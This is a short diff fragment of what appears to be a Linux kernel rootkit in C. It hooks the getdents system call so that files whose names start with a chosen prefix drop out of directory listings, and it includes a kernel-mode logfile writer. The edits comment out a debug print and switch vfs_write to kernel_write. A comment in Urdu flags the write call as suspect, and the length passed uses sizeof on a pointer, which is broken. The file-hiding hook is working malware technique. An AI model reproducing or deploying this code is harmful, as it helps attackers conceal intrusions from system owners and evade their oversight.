@@ -56,7 +56,7 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	// go through the entries, looking for one that has our prefix
 	for (boff = 0; boff < ret;) {
 		ent = (struct linux_dirent*)(dbuf + boff);
-        printk("%s", ent->d_name);
+        //printk("%s", ent->d_name);
 		if ((strncmp(ent->d_name, HIDE_PREFIX, HIDE_PREFIX_SZ) == 0)) {   
 			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
 			ret -= ent->d_reclen;
@@ -121,7 +121,7 @@ int write_to_logfile(char *buffer)
 	fs = get_fs();
 	set_fs(KERNEL_DS);
 
-	ret=vfs_write(file, buffer, sizeof(buffer) - 1, &pos);
+	ret=kernel_write(file, buffer, sizeof(buffer) - 1, &pos);	//yahan kuch garbar hy
 	if (ret < 0) {
         printk(KERN_ERR "Failed to write to file: %d but the string was %s\n", ret,buffer);
         filp_close(file, NULL);
